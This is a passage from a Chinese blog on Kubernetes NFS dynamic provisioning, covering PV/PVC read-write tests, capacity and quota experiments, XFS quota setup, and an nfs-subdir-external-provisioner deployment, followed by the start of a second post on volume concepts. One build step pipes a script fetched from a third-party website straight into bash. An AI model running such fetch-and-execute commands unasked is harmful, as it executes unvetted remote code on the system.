name:nfs-pvcmountPath:\u0026#34;/mnt\u0026#34;restartPolicy:\u0026#34;Never\u0026#34;volumes:- name:nfs-pvcpersistentVolumeClaim:claimName:nfs  pod使用nfs pvc写操作，即往挂载路径/srv/pvc-idxxxxx/ 写\n1  kubectl create -f deploy/kubernetes_incubator_nfs_provisioner/write-pod.yaml   1 2 3 4 5  [root@node131 srv]# cd pvc-26703096-84df-4c18-88f5-16d0b09be156/ [root@node131 pvc-26703096-84df-4c18-88f5-16d0b09be156]# ll 总用量 0 -rw-r--r--. 1 root root 0 2月 8 11:16 SUCCESS   存储读操作 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  kind:PodapiVersion:v1metadata:name:read-podspec:containers:- name:read-podimage:busyboximagePullPolicy:IfNotPresentcommand:- \u0026#34;/bin/sh\u0026#34;args:- \u0026#34;-c\u0026#34;- \u0026#34;test -f /mnt/SUCCESS \u0026amp;\u0026amp; exit 0 || exit 1\u0026#34;volumeMounts:- name:nfs-pvcmountPath:\u0026#34;/mnt\u0026#34;restartPolicy:\u0026#34;Never\u0026#34;volumes:- name:nfs-pvcpersistentVolumeClaim:claimName:nfs  pod使用nfs pvc读操作，即往挂载路径/srv/pvc-idxxxxx/ 读\n1  kubectl create -f deploy/kubernetes_incubator_nfs_provisioner/read-pod.yaml   pod运行情况 1 2 3 4 5 6 7 8 9 10 11 12 13 14  [root@node131 pvc-26703096-84df-4c18-88f5-16d0b09be156]# kubectl get po -A NAMESPACE NAME READY STATUS RESTARTS AGE default nfs-provisioner-66ccf9bc7b-jpm2w 1/1 Running 0 38m default read-pod 0/1 Completed 0 7s default write-pod 0/1 Completed 0 8m43s kube-system calico-kube-controllers-65b86747bd-c4qsp 1/1 Running 16 47d kube-system calico-node-lglh4 1/1 Running 18 47d kube-system coredns-8677555d68-jwggm 1/1 Running 4 6d1h kube-system kube-apiserver-node131 1/1 Running 16 47d kube-system kube-controller-manager-node131 1/1 Running 17 47d kube-system kube-proxy-mktp9 1/1 Running 16 47d kube-system kube-scheduler-node131 1/1 Running 17 47d kube-system nodelocaldns-lfjzs 1/1 Running 16 47d   业务pod使用pvc时，删除pvc 业务pod状态为complete状态，进行delete pvc操作\n此时命令会阻塞，pvc状态为保护过程中的Terminating\n1 2 3 4 5 6 7 8 9  [root@node131 nfs]# kubectl delete -f deploy/kubernetes_incubator_nfs_provisioner/claim.yaml persistentvolumeclaim \u0026#34;nfs\u0026#34; deleted ^C [root@node131 nfs]# [root@node131 nfs]# kubectl get pvc NAME STATUS VOLUME CAPACITY ACCESS MODES STORAGECLASS AGE nfs Terminating pvc-26703096-84df-4c18-88f5-16d0b09be156 1Mi RWX example-nfs 39m   无业务pod使用pvc时，删除pvc 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  [root@node131 nfs]# kubectl delete po write-pod pod \u0026#34;write-pod\u0026#34; deleted [root@node131 nfs]# [root@node131 nfs]# kubectl get pvc NAME STATUS VOLUME CAPACITY ACCESS MODES STORAGECLASS AGE nfs Terminating pvc-26703096-84df-4c18-88f5-16d0b09be156 1Mi RWX example-nfs 41m [root@node131 nfs]# [root@node131 nfs]# [root@node131 nfs]# kubectl delete po read-pod pod \u0026#34;read-pod\u0026#34; deleted [root@node131 nfs]# [root@node131 nfs]# [root@node131 nfs]# kubectl get pvc No resources found in default namespace. [root@node131 nfs]#   上面阻塞的delete pvc操作，会删除pvc，同时由于pv的delete回收策略，该pvc对应的存储挂载目录也会删除\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  [root@node131 nfs]# kubectl get pvc No resources found in default namespace. [root@node131 nfs]# [root@node131 nfs]# [root@node131 nfs]# kubectl get pv No resources found [root@node131 nfs]# [root@node131 srv]# ll 总用量 16 -rw-r--r--. 1 root root 5140 2月 8 11:32 ganesha.log -rw-------. 1 root root 36 2月 8 10:46 nfs-provisioner.identity drwxr-xr-x. 3 root root 19 2月 8 10:46 v4old drwxr-xr-x. 3 root root 19 2月 8 10:46 v4recov -rw-------. 1 root root 667 2月 8 11:32 vfs.conf [root@node131 srv]#   配额测试 部署pod 1 2 3 4 5 6 7  kubectl create -f deploy/kubernetes_incubator_nfs_provisioner/test_pod/custom-nfs-busybox-rc.yaml kubectl create -f deploy/kubernetes_incubator_nfs_provisioner/test_pod/nfs-web-rc.yaml kubectl create -f deploy/kubernetes_incubator_nfs_provisioner/test_pod/nfs-web-service.yaml   挂载目录下的数据情况，新增了index.html\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  [root@node131 pvc-4f32a250-f6da-4534-80fd-196221b555d9]# ll -h 总用量 4.0K -rw-r--r--. 1 root root 611 2月 8 14:15 index.html -rw-r--r--. 1 root root 0 2月 8 11:57 SUCCESS [root@node131 pvc-4f32a250-f6da-4534-80fd-196221b555d9]# [root@node131 pvc-4f32a250-f6da-4534-80fd-196221b555d9]# [root@node131 pvc-4f32a250-f6da-4534-80fd-196221b555d9]# [root@node131 pvc-4f32a250-f6da-4534-80fd-196221b555d9]# cat index.html Mon Feb 8 06:14:38 UTC 2021 nfs-busybox-54846 Mon Feb 8 06:14:39 UTC 2021 nfs-busybox-8fqcr Mon Feb 8 06:14:44 UTC 2021   测试pvc的容量为1M，在挂载目录/srv/pvc-4f32a250-f6da-4534-80fd-196221b555d9下，写入个2M大小的文件。查看测试pod是否还能继续写入数据，观察可知，在nfs provisoner的默认参数下，测试pod还能继续往挂载目录中写入数据。index.html大小由11k新增到了14k并继续增加\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  [root@node131 pvc-4f32a250-f6da-4534-80fd-196221b555d9]# [root@node131 pvc-4f32a250-f6da-4534-80fd-196221b555d9]# ll -h 总用量 2.1M -rw-r--r--. 1 root root 11K 2月 8 14:28 index.html -rw-r--r--. 1 root root 0 2月 8 11:57 SUCCESS -rw-r--r--. 1 root root 2.0M 2月 8 14:25 tmp.2M [root@node131 pvc-4f32a250-f6da-4534-80fd-196221b555d9]# [root@node131 pvc-4f32a250-f6da-4534-80fd-196221b555d9]# [root@node131 pvc-4f32a250-f6da-4534-80fd-196221b555d9]# [root@node131 pvc-4f32a250-f6da-4534-80fd-196221b555d9]# pwd /srv/pvc-4f32a250-f6da-4534-80fd-196221b555d9 [root@node131 pvc-4f32a250-f6da-4534-80fd-196221b555d9]# [root@node131 pvc-4f32a250-f6da-4534-80fd-196221b555d9]# [root@node131 pvc-4f32a250-f6da-4534-80fd-196221b555d9]# ll -h 总用量 2.1M -rw-r--r--. 1 root root 14K 2月 8 14:31 index.html -rw-r--r--. 1 root root 0 2月 8 11:57 SUCCESS -rw-r--r--. 1 root root 2.0M 2月 8 14:25 tmp.2M [root@node131 pvc-4f32a250-f6da-4534-80fd-196221b555d9]#   目录挂载情况，有2个写pod和2个读pod共4个业务pod在运行\n1 2 3 4 5 6 7 8 9 10  [root@node131 2129b202-2d91-400f-b04e-5e57f9c105b6]# mount |grep pvc 10.233.14.76:/export/pvc-4f32a250-f6da-4534-80fd-196221b555d9 on /var/lib/kubelet/pods/69448210-b1c1-4444-8c24-29024770acff/volumes/kubernetes.io~nfs/pvc-4f32a250-f6da-4534-80fd-196221b555d9 type nfs4 (rw,relatime,vers=4.1,rsize=1048576,wsize=1048576,namlen=255,hard,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=10.233.14.76,local_lock=none,addr=10.233.14.76) 10.233.14.76:/export/pvc-4f32a250-f6da-4534-80fd-196221b555d9 on /var/lib/kubelet/pods/337827e0-4924-4afb-b41e-a19c522d59d6/volumes/kubernetes.io~nfs/pvc-4f32a250-f6da-4534-80fd-196221b555d9 type nfs4 (rw,relatime,vers=4.1,rsize=1048576,wsize=1048576,namlen=255,hard,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=10.233.14.76,local_lock=none,addr=10.233.14.76) 10.233.14.76:/export/pvc-4f32a250-f6da-4534-80fd-196221b555d9 on /var/lib/kubelet/pods/888dd122-e529-4f36-bca4-828667c997dd/volumes/kubernetes.io~nfs/pvc-4f32a250-f6da-4534-80fd-196221b555d9 type nfs4 (rw,relatime,vers=4.1,rsize=1048576,wsize=1048576,namlen=255,hard,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=10.233.14.76,local_lock=none,addr=10.233.14.76) 10.233.14.76:/export/pvc-4f32a250-f6da-4534-80fd-196221b555d9 on /var/lib/kubelet/pods/0298070d-66e2-43e1-947c-d4ae0f5fab4b/volumes/kubernetes.io~nfs/pvc-4f32a250-f6da-4534-80fd-196221b555d9 type nfs4 (rw,relatime,vers=4.1,rsize=1048576,wsize=1048576,namlen=255,hard,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=10.233.14.76,local_lock=none,addr=10.233.14.76) [root@node131 2129b202-2d91-400f-b04e-5e57f9c105b6]#   删除测试pod，保留pv和pvc，检查挂载目录仍然存在。此时挂载目录大小\u0026gt;2M\n再重新部署测试pod，发现部署成功，说明pod使用pvc请求容量大小时并不检查挂载目录pvc要求数据大小。 实际上挂载了整个容量大小，如下图。\n1 2 3 4 5  [root@node131 srv]# df -hT |grep pvc 文件系统 类型 容量 已用 可用 已用% 挂载点 10.233.14.76:/export/pvc-4f32a250-f6da-4534-80fd-196221b555d9 nfs4 17G 11G 6.8G 61% /var/lib/kubelet/pods/06940ab3-4d60-4015-8c39-3bb15b331e7f/volumes/kubernetes.io~nfs/pvc-4f32a250-f6da-4534-80fd-196221b555d9   考虑开启配额参数 删除原有 nfs_provisioner，修改 nfs_provisioner参数后，部署\n1 2 3 4 5 6 7 8 9 10 11 12 13  kubectl create -f deploy/kubernetes_incubator_nfs_provisioner/rbac.yaml kubectl create -f deploy/kubernetes_incubator_nfs_provisioner/xfs_deployment.yaml kubectl create -f deploy/kubernetes_incubator_nfs_provisioner/class.yaml kubectl create -f deploy/kubernetes_incubator_nfs_provisioner/claim.yaml sleep 10s kubectl get pv kubectl get pvc   nfs_provisioner启动失败，需要系统开启xfs配额功能\n在本地虚拟机环境未操作生效成功。。。\n卸载删除 1 2 3 4 5 6 7 8 9 10 11 12  kubectl delete -f deploy/kubernetes_incubator_nfs_provisioner/claim.yaml kubectl delete -f deploy/kubernetes_incubator_nfs_provisioner/class.yaml kubectl delete -f deploy/kubernetes_incubator_nfs_provisioner/xfs_deployment.yaml kubectl delete -f deploy/kubernetes_incubator_nfs_provisioner/rbac.yaml   删除pod 1 2 3 4 5 6 7  kubectl delete -f deploy/kubernetes_incubator_nfs_provisioner/test_pod/nfs-web-service.yaml kubectl delete -f deploy/kubernetes_incubator_nfs_provisioner/test_pod/nfs-web-rc.yaml kubectl delete -f deploy/kubernetes_incubator_nfs_provisioner/test_pod/custom-nfs-busybox-rc.yaml   nfs-client-provisioner 如果集群系统中已有存储系统服务，则可使用nfs-subdir-external-provisioner项目组件来提供动态pv支持\nKubernetes NFS-Client Provisioner NFS subdir external provisioner is an automatic provisioner that use your existing and already configured NFS server to support dynamic provisioning of Kubernetes Persistent Volumes via Persistent Volume Claims. Persistent volumes are provisioned as ${namespace}-${pvcName}-${pvName}.\nnfs-subdir-external-provisioner\nmake container 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  # export GOPATH=/home/wangb/projects export GO111MODULE=on # export GO111MODULE=off # go env -w GOPROXY=https://goproxy.cn,direct # 进入项目目录 # 下载依赖 go mod tidy # 生成项目vendor go mod vendor # fix bug : gcr.io/distroless/static:latest pull failed docker pull registry.cn-hangzhou.aliyuncs.com/google_containers/distroless/static:latest ## 镜像制作 # 基础镜像  curl -s https://zhangguanzhang.github.io/bash/pull.sh | bash -s -- gcr.io/distroless/static:latest # 制作 make container # 镜像名称和标签 # `nfs-subdir-external-provisioner:latest` will be created.   配置文件 deployment 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  apiVersion:apps/v1kind:Deploymentmetadata:name:nfs-client-provisionerlabels:app:nfs-client-provisioner# replace with namespace where provisioner is deployednamespace:defaultspec:replicas:1strategy:type:Recreateselector:matchLabels:app:nfs-client-provisionertemplate:metadata:labels:app:nfs-client-provisionerspec:serviceAccountName:nfs-client-provisionercontainers:- name:nfs-client-provisioner# image: gcr.io/k8s-staging-sig-storage/nfs-subdir-external-provisioner:v4.0.0image:nfs-subdir-external-provisioner:latestimagePullPolicy:\u0026#34;IfNotPresent\u0026#34;volumeMounts:- name:nfs-client-rootmountPath:/persistentvolumesenv:- name:PROVISIONER_NAMEvalue:k8s-sigs.io/nfs-subdir-external-provisioner- name:NFS_SERVERvalue:192.168.11.54- name:NFS_PATHvalue:/mnt/inspurfsvolumes:- name:nfs-client-rootnfs:server:192.168.11.54path:/mnt/inspurfs  storage class 1 2 3 4 5 6 7 8 9  apiVersion:storage.k8s.io/v1kind:StorageClassmetadata:name:managed-nfs-storageprovisioner:k8s-sigs.io/nfs-subdir-external-provisioner# or choose another name, must match deployment\u0026#39;s env PROVISIONER_NAME\u0026#39;parameters:pathPattern:\u0026#34;${.PVC.namespace}/${.PVC.annotations.nfs.io/storage-path}\u0026#34;# waits for nfs.io/storage-path annotation, if not specified will accept as empty string.archiveOnDelete:\u0026#34;false\u0026#34;  pvc 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  kind:PersistentVolumeClaimapiVersion:v1metadata:name:test-claimannotations:nfs.io/storage-path:\u0026#34;test-path\u0026#34;# not required, depending on whether this annotation was shown in the storage class descriptionspec:storageClassName:managed-nfs-storageaccessModes:- ReadWriteManyresources:requests:storage:1Mi  部署 1 2 3 4 5 6 7 8 9  kubectl create -f custom_deploy/rbac.yaml kubectl create -f custom_deploy/deployment.yaml kubectl create -f custom_deploy/class.yaml kubectl create -f custom_deploy/test-claim.yaml -f custom_deploy/test-pod.yaml kubectl create -f custom_deploy/run-test-pod.yaml   问题结论  PV共用机制，是否可以做到超分？是否可以有用户的概念？    一个pv只能被一个pvc使用，pv实际上k8s的一种资源类型（类比node），没有用户的概念。用户可见并使用的是pvc，多个用户（pod）可以使用相同的pvc。\n  配额是依赖底层存储配置参数实现，如果使用pvc实现，则需要使用pv-provisioner封装存储组件来支持配额功能，此时由于对目录的配额限制会导致无法超分。\n  nfs的pvc 能否控制住大小？   pvc可以request使用量大小，但不是pvc和k8s来控制大小，实际上通过nfs的配额参数和xfs文件系统的存储配额参数设置实现 k8s只是通过pv和pvc管理存储信息，并通过kubelet的volume manager对存储目录进行挂载和卸载操作  PV对多个Pod使用时，能否控制总量？   pod不直接使用pv，而是通过pv声明pvc方式来绑定pv使用 目前，如果不通过storageclass的动态方式（手动创建pv），或者storageclass中nfs-provision不使用配额参数，则无法实现存储总量控制。  PV是否能在线更新，比如扩容？    无论是手动创建pv还是动态创建pv，如果直接修改pv（如，pv的Capacity从1M调整到2M），修改生效。但之前已创建的pvc的Capacity并没有发生变化（仍是原来的1M）。\n  如果通过修改pvc来更新存储资源pv的配置。需使用storageclass方式可以实现pvc-\u0026gt;pv的容量关联扩容。只有动态供应的pvc可以调整大小，供应pvc的存储类型必须支持调整大小。即满足如下条件：\n Kube-ApiServer 参数：PersistentVolumeClaimResize插件 使能 StorageClass 配置yaml的allowVolumeExpansion设置为true 在官方文档对StorageClass扩容支持的存储类型范围内    nfs无法通过通过pvc的resize扩容操作，来自动关联修改pv\n  如果底层存储出问题，k8s是否能够感知管理，故障恢复。   底层存储依赖于具体存储组件（如：nfs）实现的异常处理。或考虑把nfs组件封装成nfs-server + nfs-provisioner 当做k8s集群中的pod管理起来。  参考  持久存储设计文档 存储类StorageClass nfs-subdir-external-provisioner https://www.cnblogs.com/panwenbin-logs/p/12196286.html  附录 配置 StorageClass class.yaml\n1 2 3 4 5 6 7  kind:StorageClassapiVersion:storage.k8s.io/v1metadata:name:example-nfsprovisioner:example.com/nfsmountOptions:- vers=4.1  PersistentVolumeClaim claim.yaml\n1 2 3 4 5 6 7 8 9 10 11  kind:PersistentVolumeClaimapiVersion:v1metadata:name:nfsspec:storageClassName:example-nfsaccessModes:- ReadWriteManyresources:requests:storage:1Mi  dd命令 构造指定大小文件 1 2 3 4  # 从/dev/null每次读取1G数据，读5次，写入tmp.5G这个文件 # dd if=/dev/zero of=tmp.5G bs=1G count=5 dd if=/dev/zero of=tmp.2M bs=1M count=2    if=FILE : 指定输入文件，若不指定则从标注输入读取。这里指定为/dev/zero是Linux的一个伪文件，它可以产生连续不断的null流（二进制的0） of=FILE : 指定输出文件，若不指定则输出到标准输出 bs=BYTES : 每次读写的字节数，可以使用单位K、M、G等等。另外输入输出可以分别用ibs、obs指定，若使用bs，则表示是ibs和obs都是用该参数 count=BLOCKS : 读取的block数，block的大小由ibs指定（只针对输入参数）  开启xfs的quota特性 1 2 3 4 5 6 7 8  #什么结果都没有，这个表示没有设置配额 xfs_quota -x -c \u0026#39;report\u0026#39; / mount -o remount,rw,uquota,prjquota / # 在开始划分分区的时候就要让分区的配额生效，添加一块硬盘作为docker的数据目录 #fdisk -l | grep sdb #Disk /dev/sdb: 53.7 GB, 53687091200 bytes, 104857600 sector   编辑/etc/fstab vi /etc/fstab\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  [root@node131 nfs]# cat /etc/fstab # # /etc/fstab # Created by anaconda on Thu Dec 17 15:27:09 2020 # # Accessible filesystems, by reference, are maintained under \u0026#39;/dev/disk\u0026#39; # See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info # #/dev/mapper/centos_master-root / xfs defaults 0 0 /dev/mapper/centos_master-root / xfs defaults,usrquota,grpquota 0 0 UUID=d13f3d45-3ac2-4cda-b1ce-715d3153a900 /boot xfs defaults 0 0   注，类型如下：\n  根据用户(uquota/usrquota/quota)\n  根据组(gquota/grpquota)\n  根据目录(pquota/prjquota)(不能与grpquota同时设定)\n  卸载并重新挂载 1 2 3 4 5 6  #umount /home #mount -a #由于挂载了 /目录，采用重启操作 rebot now   2.2.3 检查\n1 2 3 4  # mount | grep home mount | grep centos   1 2 3 4  [root@node131 ~]# mount | grep centos /dev/mapper/centos_master-root on / type xfs (rw,relatime,seclabel,attr2,inode64,noquota) [root@node131 ~]#   结果：在本地虚拟机环境未生效，操作未成功。。。\n错误 新项目代码无法进行镜像制作 make container报错信息见下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  [root@node1 nfs-ganesha-server-and-external-provisioner-master]# make container ./release-tools/verify-go-version.sh \u0026#34;go\u0026#34; fatal: Not a git repository (or any parent up to mount point /home) Stopping at filesystem boundary (GIT_DISCOVERY_ACROSS_FILESYSTEM not set). mkdir -p bin echo \u0026#39;\u0026#39; | tr \u0026#39;;\u0026#39; \u0026#39;\\n\u0026#39; | while read -r os arch suffix; do \\ if ! (set -x; CGO_ENABLED=0 GOOS=\u0026#34;$os\u0026#34; GOARCH=\u0026#34;$arch\u0026#34; go build -a -ldflags \u0026#39; -X main.version= -extldflags \u0026#34;-static\u0026#34;\u0026#39; -o \u0026#34;./bin/nfs-provisioner$suffix\u0026#34; ./cmd/nfs-provisioner); then \\ echo \u0026#34;Building nfs-provisioner for GOOS=$os GOARCH=$arch failed, see error(s) above.\u0026#34;; \\ exit 1; \\ fi; \\ done + CGO_ENABLED=0 + GOOS= + GOARCH= + go build -a -ldflags \u0026#39; -X main.version= -extldflags \u0026#34;-static\u0026#34;\u0026#39; -o ./bin/nfs-provisioner ./cmd/nfs-provisioner fatal: Not a git repository (or any parent up to mount point /home) Stopping at filesystem boundary (GIT_DISCOVERY_ACROSS_FILESYSTEM not set). docker build -t nfs-provisioner:latest -f Dockerfile --label revision= . Sending build context to Docker daemon 69.19MB Step 1/19 : FROM fedora:30 AS build 30: Pulling from library/fedora 401909e6e2aa: Pull complete Digest: sha256:3a0c8c86d8ac2d1bbcfd08d40d3b757337f7916fb14f40efcb1d1137a4edef45 Status: Downloaded newer image for fedora:30 ---\u0026gt; 177d5adf0c6c Step 2/19 : RUN dnf install -y tar gcc cmake-3.14.2-1.fc30 autoconf libtool bison flex make gcc-c++ krb5-devel dbus-devel jemalloc-devel libnfsidmap-devel libnsl2-devel userspace-rcu-devel patch libblkid-devel ---\u0026gt; Running in b6cb5632e5a4 Fedora Modular 30 - x86_64 0.0 B/s | 0 B 04:00 Errors during downloading metadata for repository \u0026#39;fedora-modular\u0026#39;: - Curl error (6): Couldn\u0026#39;t resolve host name for https://mirrors.fedoraproject.org/metalink?repo=fedora-modular-30\u0026amp;arch=x86_64 [Could not resolve host: mirrors.fedoraproject.org] Error: Failed to download metadata for repo \u0026#39;fedora-modular\u0026#39;: Cannot prepare internal mirrorlist: Curl error (6): Couldn\u0026#39;t resolve host name for https://mirrors.fedoraproject.org/metalink?repo=fedora-modular-30\u0026amp;arch=x86_64 [Could not resolve host: mirrors.fedoraproject.org] The command \u0026#39;/bin/sh -c dnf install -y tar gcc cmake-3.14.2-1.fc30 autoconf libtool bison flex make gcc-c++ krb5-devel dbus-devel jemalloc-devel libnfsidmap-devel libnsl2-devel userspace-rcu-devel patch libblkid-devel\u0026#39; returned a non-zero code: 1 make: *** [container-nfs-provisioner] Error 1 [root@node1 nfs-ganesha-server-and-external-provisioner-master]#   改用直接拉取镜像方式获得。\n开启配额参数， nfs provisioner 启动报错 报错信息\n1  Error creating xfs quotaer! xfs path /export was not mounted with pquota nor prjquota   系统的挂载盘使用的是xfs文件系统的默认参数，没有开启配额功能\n所以无法挂载成功\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  [root@node131 /]# mount | grep centos /dev/mapper/centos_master-root on / type xfs (rw,relatime,seclabel,attr2,inode64,noquota) [root@node131 /]# cat /etc/fstab # # /etc/fstab # Created by anaconda on Thu Dec 17 15:27:09 2020 # # Accessible filesystems, by reference, are maintained under \u0026#39;/dev/disk\u0026#39; # See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info # /dev/mapper/centos_master-root / xfs defaults 0 0 UUID=d13f3d45-3ac2-4cda-b1ce-715d3153a900 /boot xfs defaults 0 0     https://kim1024.github.io/2018/11/27/quota-with-xfs.html\n  https://blog.csdn.net/weixin_36458030/article/details/112232427\n  CentOS关于quota的总结与实践 https://blog.csdn.net/mnasd/article/details/80766756\n  https://github.com/kubernetes/enhancements/tree/master/keps/sig-storage/531-online-pv-resizing\n  pvc状态为pending 可能是nfs没有挂载成功，检查nfs挂载\n1 2 3 4 5 6 7 8 9 10  [root@node61 wangb]# kubectl get pvc NAME STATUS VOLUME CAPACITY ACCESS MODES STORAGECLASS AGE test-claim Pending managed-nfs-storage 12m ---- ------ ---- ---- ------- Normal Provisioning 7m49s k8s-sigs.io/nfs-subdir-external-provisioner_nfs-client-provisioner-59b4c555d6-gl8pw_494f3aed-c583-4819-8af0-3fd2de70307f External provisioner is provisioning volume for claim \u0026#34;default/test-claim\u0026#34; Normal ExternalProvisioning 108s (x26 over 7m49s) persistentvolume-controller waiting for a volume to be created, either by external provisioner \u0026#34;k8s-sigs.io/nfs-subdir-external-provisioner\u0026#34; or manually created by system administrator   ","permalink":"http://bingerambo.com/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/","tags":["K8S"],"title":"k8s dynamic provisioning and storage 介绍"},{"categories":["K8S"],"contents":"介绍K8S的PV和PVC概念和设计原理。\nk8s的PV和PVC概念 卷 Container 中的文件在磁盘上是临时存放的，这给 Container 中运行的较重要的应用 程序带来一些问题。\n 问题之一是当容器崩溃时文件丢失。kubelet 会重新启动容器， 但容器会以干净的状态重启。 第二个问题会在同一 Pod 中运行多个容器并共享文件时出现。  Kubernetes 卷（Volume） 这一抽象概念能够解决这两个问题。\nKubernetes 支持很多类型的卷。 Pod 可以同时使用任意数目的卷类型。 临时卷类型的生命周期与 Pod 相同，但持久卷可以比 Pod 的存活期长。 因此，卷的存在时间会超出 Pod 中运行的所有容器，并且在容器重新启动时数据也会得到保留。 当 Pod 不再存在时，卷也将不再存在。\n卷的核心是包含一些数据的一个目录，Pod 中的容器可以访问该目录。 所采用的特定的卷类型将决定该目录如何形成的、使用何种介质保存数据以及目录中存放 的内容。\nconfigMap configMap 卷 提供了向 Pod 注入配置数据的方法。 ConfigMap 对象中存储的数据可以被 configMap 类型的卷引用，然后被 Pod 中运行的 容器化应用使用。\n引用 configMap 对象时，你可以在 volume 中通过它的名称来引用。 你可以自定义 ConfigMap 中特定条目所要使用的路径。 下面的配置显示了如何将名为 log-config 的 ConfigMap 挂载到名为 configmap-pod 的 Pod 中：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  apiVersion:v1kind:Podmetadata:name:configmap-podspec:containers:- name:testimage:busyboxvolumeMounts:- name:config-volmountPath:/etc/configvolumes:- name:config-volconfigMap:name:log-configitems:- key:log_levelpath:log_level  log-config ConfigMap 以卷的形式挂载，并且存储在 log_level 条目中的所有内容 都被挂载到 Pod 的 /etc/config/log_level 路径下。 请注意，这个路径来源于卷的 mountPath 和 log_level 键对应的 path。\n 说明：\n 在使用 ConfigMap 之前你首先要创建它。 容器以 subPath 卷挂载方式使用 ConfigMap 时，将无法接收 ConfigMap 的更新。 文本数据挂载成文件时采用 UTF-8 字符编码。如果使用其他字符编码形式，可使用 binaryData 字段。   emptyDir 当 Pod 分派到某个 Node 上时，emptyDir 卷会被创建，并且在 Pod 在该节点上运行期间，卷一直存在。 就像其名称表示的那样，卷最初是空的。 尽管 Pod 中的容器挂载 emptyDir 卷的路径可能相同也可能不同，这些容器都可以读写 emptyDir 卷中相同的文件。 当 Pod 因为某些原因被从节点上删除时，emptyDir 卷中的数据也会被永久删除。\n说明： 容器崩溃并不会导致 Pod 被从节点上移除，因此容器崩溃期间 emptyDir 卷中的数据是安全的。 emptyDir 的一些用途：\n 缓存空间，例如基于磁盘的归并排序。 为耗时较长的计算任务提供检查点，以便任务能方便地从崩溃前状态恢复执行。 在 Web 服务器容器服务数据时，保存内容管理器容器获取的文件。  hostPath hostPath 卷能将主机节点文件系统上的文件或目录挂载到你的 Pod 中。 虽然这不是大多数 Pod 需要的，但是它为一些应用程序提供了强大的逃生舱。\n例如，hostPath 的一些用法有：\n运行一个需要访问 Docker 内部机制的容器；可使用 hostPath 挂载 /var/lib/docker 路径。 在容器中运行 cAdvisor 时，以 hostPath 方式挂载 /sys。 允许 Pod 指定给定的 hostPath 在运行 Pod 之前是否应该存在，是否应该创建以及应该以什么方式存在。 除了必需的 path 属性之外，用户可以选择性地为 hostPath 卷指定 type。\nSecret secret 卷用来给 Pod 传递敏感信息，例如密码。你可以将 Secret 存储在 Kubernetes API 服务器上，然后以文件的形式挂在到 Pod 中，无需直接与 Kubernetes 耦合。 secret 卷由 tmpfs（基于 RAM 的文件系统）提供存储，因此它们永远不会被写入非易失性 （持久化的）存储器。\n 说明： 使用前你必须在 Kubernetes API 中创建 secret。 说明： 容器以 subPath 卷挂载方式挂载 Secret 时，将感知不到 Secret 的更新。\n secret说明文档：https://kubernetes.io/zh/docs/concepts/configuration/secret/\nnfs nfs 卷能将 NFS (网络文件系统) 挂载到你的 Pod 中。 不像 emptyDir 那样会在删除 Pod 的同时也会被删除，nfs 卷的内容在删除 Pod 时会被保存，卷只是被卸载。 这意味着 nfs 卷可以被预先填充数据，并且这些数据可以在 Pod 之间共享。\n注意： 在使用 NFS 卷之前，你必须运行自己的 NFS 服务，并将目标 share 导出备用。\nnfs示例\npersistentVolumeClaim persistentVolumeClaim 卷用来将持久卷（PersistentVolume） 挂载到 Pod 中。 持久卷声明（PersistentVolumeClaim）是用户在不知道特定云环境细节的情况下\u0026quot;声明\u0026quot;持久存储 （例如 GCE PersistentDisk 或者 iSCSI 卷）的一种方法。\n更多详情请参考持久卷示例\n持久卷 persistent-volumes概念\n存储的管理是一个与计算实例的管理完全不同的问题。PersistentVolume 子系统为用户 和管理员提供了一组 API，将存储如何供应的细节从其如何被使用中抽象出来。 为了实现这点，我们引入了两个新的 API 资源：PersistentVolume 和 PersistentVolumeClaim。\n持久卷（PersistentVolume，PV）是集群中的一块存储，可以由管理员事先供应，或者 使用存储类（Storage Class）来动态供应。 持久卷是集群资源，就像节点也是集群资源一样。PV 持久卷和普通的 Volume 一样，也是使用 卷插件来实现的，只是它们拥有独立于任何使用 PV 的 Pod 的生命周期。 此 API 对象中记述了存储的实现细节，无论其背后是 NFS、iSCSI 还是特定于云平台的存储系统。\n持久卷声明（PersistentVolumeClaim，PVC）表达的是用户对存储的请求。概念上与 Pod 类似。 Pod 会耗用节点资源，而 PVC 声明会耗用 PV 资源。Pod 可以请求特定数量的资源（CPU 和内存）；同样 PVC 声明也可以请求特定的大小和访问模式 （例如，可以要求 PV 卷能够以 ReadWriteOnce、ReadOnlyMany 或 ReadWriteMany 模式之一来挂载，参见访问模式）。\n尽管 PersistentVolumeClaim 允许用户消耗抽象的存储资源，常见的情况是针对不同的 问题用户需要的是具有不同属性（如，性能）的 PersistentVolume 卷。 集群管理员需要能够提供不同性质的 PersistentVolume，并且这些 PV 卷之间的差别不 仅限于卷大小和访问模式，同时又不能将卷是如何实现的这些细节暴露给用户。 为了满足这类需求，就有了 存储类（StorageClass） 资源。\nPV不属于任何命名空间, 它跟节点（node）一样是集群层面的资源，区别于pod和PVC。由系统管理员创建管理。\n当集群用户需要在其pod中使用持久化存储时，他们首先创建PVC清单，指定所需要的最低容量要求和访问模式，然后用户将待久卷声明清单提交给Kubernetes API服务器，Kubernetes将找到可匹配的PV并将其绑定到PVC。PVC可以当作pod中的一个卷来使用，其他用户不能使用相同的PV，除非先通过删除PVC绑定来释放。 供应 PV 